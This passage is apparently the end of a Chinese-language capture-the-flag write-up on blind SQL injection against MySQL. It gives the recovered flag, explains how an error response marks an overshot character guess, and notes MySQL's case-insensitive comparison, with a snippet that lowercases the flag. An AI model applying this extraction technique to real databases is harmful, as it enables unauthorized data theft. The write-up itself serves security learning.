 #输出:FLAG{0F444C84-7580-4A33-B2E8-19FCE4439E7D} 
```

注意这里如果返回了`Error Occured When Fetch Result`,说明当前比较的字母已经大于flag中对应位置的字母了

那么它前一个字母是和flag中对应位置相等的,所以12行是`flag = flag + chr(c-1)`

另外, 上面输出的全都是大写字母的原因是:  `mysql`中比较是不区分大小写的,所以尽管`N`的 ascii码小于`a`,但是在上面判定时还是会判断为`N`>`a`  但这不影响我们的结果,只要把上面的flag转为小写就可以了.

```python
flag = "FLAG{0F444C84-7580-4A33-B2E8-19FCE4439E7D}"
print(flag.lower())
```



















































